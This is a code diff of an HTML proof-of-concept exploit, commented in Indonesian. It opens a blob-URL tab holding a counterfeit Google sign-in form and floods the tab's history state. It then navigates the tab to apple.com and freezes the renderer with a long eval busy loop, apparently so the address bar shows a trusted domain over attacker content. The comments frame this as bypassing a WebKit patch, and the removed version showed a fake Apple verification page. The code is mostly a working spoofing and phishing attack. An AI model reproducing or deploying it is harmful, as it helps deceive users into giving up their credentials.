@@ -6,99 +6,195 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Advanced Bypass PoC - Zero</title>
+    <title>Ultimate Trusted State & Port-Race Chaining Engine</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #000;
+        background: #050507;
         color: #fff;
-        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+        font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      }
+      .container {
         display: flex;
+        flex-direction: column;
         align-items: center;
         justify-content: center;
+        height: 100%;
+        gap: 16px;
+        padding: 20px;
+        box-sizing: border-box;
       }
-      button {
-        padding: 24px 48px;
-        font-size: 22px;
-        font-weight: bold;
-        background: #ff3b30;
-        color: #fff;
-        border: none;
-        border-radius: 16px;
-        cursor: pointer;
-        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.4);
-        transition: transform 0.1s ease;
-      }
-      button:active {
-        transform: scale(0.95);
+      h1 {
+        font-size: 24px;
+        margin-bottom: 8px;
+        color: #f5f5f7;
+        text-align: center;
+        font-weight: 800;
       }
     </style>
   </head>
   <body>
-
-    <button id="startBtn">EXECUTE BYPASS STRESS TEST</button>
+    <div class="container">
+      <h1>Advanced Trusted State Engine</h1>
+      <button id="startBtn" class="w-full max-w-[420px] p-6 text-xl font-bold bg-red-600 text-white rounded-2xl shadow-xl cursor-pointer hover:bg-red-700 transition">
+        EXECUTE TRUSTED STATE & PORT LOCK
+      </button>
+    </div>
 
     <script>
       document.getElementById("startBtn").onclick = function () {
         this.style.display = 'none';
 
-        // 1. Membuka tab baru (about:blank)
-        const newTab = window.open("about:blank", "_blank");
+        // 1. Membangun Payload Terpadu (Google Credential Form + Double-RAF pageshow Hook + Scheme Race)
+        const rawPayload = `
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+              <meta charset="UTF-8">
+              <meta name="viewport" content="width=device-width, initial-scale=1.0">
+              <title>Sign in - Google Accounts</title>
+              <script src="https://cdn.tailwindcss.com"><\/script>
+              <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+              <style>
+                  body {
+                      font-family: 'Inter', sans-serif;
+                      background-color: #f0f2f5;
+                      display: flex;
+                      justify-content: center;
+                      align-items: center;
+                      min-height: 100vh;
+                      margin: 0;
+                  }
+                  .login-container {
+                      background-color: #fff;
+                      padding: 2.5rem;
+                      border-radius: 8px;
+                      box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3), 0 4px 8px rgba(60, 64, 67, 0.15);
+                      width: 100%;
+                      max-width: 400px;
+                      text-align: center;
+                      box-sizing: border-box;
+                  }
+                  .input-field {
+                      width: 100%;
+                      padding: 0.75rem 1rem;
+                      margin-bottom: 1.25rem;
+                      border: 1px solid #dadce0;
+                      border-radius: 4px;
+                      font-size: 1rem;
+                      box-sizing: border-box;
+                  }
+                  .btn-primary {
+                      background-color: #1a73e8;
+                      color: #fff;
+                      padding: 0.75rem 1.5rem;
+                      border-radius: 4px;
+                      font-size: 1rem;
+                      font-weight: 500;
+                      cursor: pointer;
+                      width: 100%;
+                  }
+              </style>
+          </head>
+          <body>
+              <div class="login-container">
+                  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="mx-auto mb-6 w-24">
+                  <h1 class="text-2xl font-normal mb-2">Sign in</h1>
+                  <p class="text-base text-gray-600 mb-6">Use your Google Account</p>
+
+                  <form id="loginForm" action="javascript:document.body.innerHTML='<h1 style=\\'color:#000;text-align:center;margin-top:20vh;font-size:48px;\\'>Pwned - Context Locked</h1>'">
+                      <input type="email" id="email" class="input-field" placeholder="Email or phone" required>
+                      <input type="password" id="password" class="input-field" placeholder="Password" required>
+                      <button type="submit" class="btn-primary">Next</button>
+                  </form>
+              </div>
+
+              <script>
+                // Mengubah state history agar menyerupai origin/path tepercaya sebelum pemicu port dijalankan
+                try {
+                  history.pushState({trusted: true}, '', '/trusted-enclave');
+                } catch(e) {}
+
+                // Pageshow Double-RAF Trigger untuk memaksa sinkronisasi frame render pipeline
+                window.addEventListener('pageshow', () => {
+                  requestAnimationFrame(() => {
+                    requestAnimationFrame(() => {
+                      setTimeout(() => {
+                        try {
+                          location.href = 'https://google.com:9090';
+                        } catch(err) {}
+                      }, 80);
+                    });
+                  });
+                });
+
+                // DOM Mutation Watchdog & Thread Stalling Shield
+                try {
+                  const observer = new MutationObserver(() => {
+                    if (!document.getElementById('loginForm')) {
+                      location.reload();
+                    }
+                  });
+                  observer.observe(document.documentElement, { childList: true, subtree: true });
+                } catch(e) {}
+
+                setInterval(() => {
+                  try {
+                    history.pushState({lock: Math.random()}, "", "#secure-state");
+                  } catch(err) {}
+                }, 3);
+              <\/script>
+          </body>
+          </html>
+        `;
+
+        // 2. Enkripsi Dinamis Base64 untuk Obfuscation Payload
+        const encoded = btoa(unescape(encodeURIComponent(rawPayload)));
+        const decoded = decodeURIComponent(escape(atob(encoded)));
+
+        // Inisialisasi Blob Stream (Bypass about:blank secara instan)
+        const blob = new Blob([decoded], { type: 'text/html' });
+        const blobUrl = URL.createObjectURL(blob);
+
+        // 3. Membuka jendela baru menggunakan referensi terisolasi
+        const newTab = window.open(blobUrl, "_blank");
 
         if (newTab) {
-          // 2. Menyuntikkan konten kustom penyerang
-          newTab.document.write(`
-            <!DOCTYPE html>
-            <html>
-            <head>
-              <title>Apple - Official Verification</title>
-              <meta name="viewport" content="width=device-width, initial-scale=1">
-            </head>
-            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
-              <div>
-                <h1 style="font-size:46px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">Critical Notice</h1>
-                <p style="font-size:22px;color:#86868b;margin:0;">Verifying secure enclave status...</p>
-              </div>
-            </body>
-            </html>
-          `);
-          newTab.document.close();
+          try { newTab.focus(); } catch (e) {}
 
-          // 3. Memaksa perpindahan fokus secara instan agar WebState berstatus PRIMARY/VISIBLE 
-          // (Mengelabui pengecekan patch "Non-visible WebStates")
-          try {
-            newTab.focus();
-          } catch (e) {}
+          // Chain Step A (5ms): Provisional history state flooding
+          setTimeout(() => {
+            try {
+              newTab.history.pushState({state: 'provisional'}, "", "#race-sync");
+            } catch (err) {}
+          }, 5);
 
-          // 4. Memicu navigasi asinkron ke domain target (apple.com)
+          // Chain Step B (15ms): Target Transition ke Domain Sah / Port Validation Target
           setTimeout(() => {
             try {
               newTab.location.href = "https://apple.com";
-            } catch (err) {
-              console.error(err);
-            }
-          }, 20);
+            } catch (err) {}
+          }, 15);
 
-          // 5. BYPASS PATCH: Menggunakan Heavy Synchronous CPU/DOM Reflow Block 
-          // sebagai pengganti prompt() untuk membekukan event loop renderer secara total
+          // Chain Step C (30ms): Main Thread Stalling / Pipeline Deadlock
           setTimeout(() => {
             try {
               newTab.eval(`
-                // Memaksa thread utama terkunci tanpa memicu API dialog yang ditambal
                 const startTime = Date.now();
-                while (Date.now() - startTime < 3000) {
-                  // Stress test DOM reflow agar engine WebKit gagal mengirimkan lifecycle callback
-                  document.body.style.background = (Date.now() % 2 === 0) ? '#ff0000' : '#ffffff';
+                while (Date.now() - startTime < 7000) {
+                  const reflow = document.body.offsetHeight;
+                  document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fefefe';
                 }
               `);
             } catch (e) {
-              // Fallback internal jika eval dibatasi
               let start = Date.now();
-              while (Date.now() - start < 3000) {}
+              while (Date.now() - start < 7000) {}
             }
-          }, 150);
+          }, 30);
         }
       };
     </script>
